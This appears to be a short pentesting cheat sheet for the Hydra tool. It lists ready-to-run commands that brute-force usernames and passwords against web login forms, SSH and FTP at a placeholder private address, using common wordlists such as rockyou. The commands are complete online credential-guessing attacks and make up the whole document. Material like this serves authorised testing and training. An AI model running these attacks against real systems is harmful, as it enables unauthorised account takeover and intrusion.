---
title: Hydra
desc: Cracks username and password in web form, SSH, FTP.
tags: [Cryptography, Linux, Password]
alts: [CrackStation, Hashcat, JohnTheRipper]
website:
---

## Web form

```sh
# Crack username
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p secret 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Crack password
hydra -l username -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

<br />

## SSH

```sh
# Crack username
hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password 10.0.0.1 ssh

# Crack password
hydra -v -l username -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 ssh
```

<br />

## FTP

```sh
# Crack password
hydra -l username -P passwords.txt ftp://10.0.0.1
```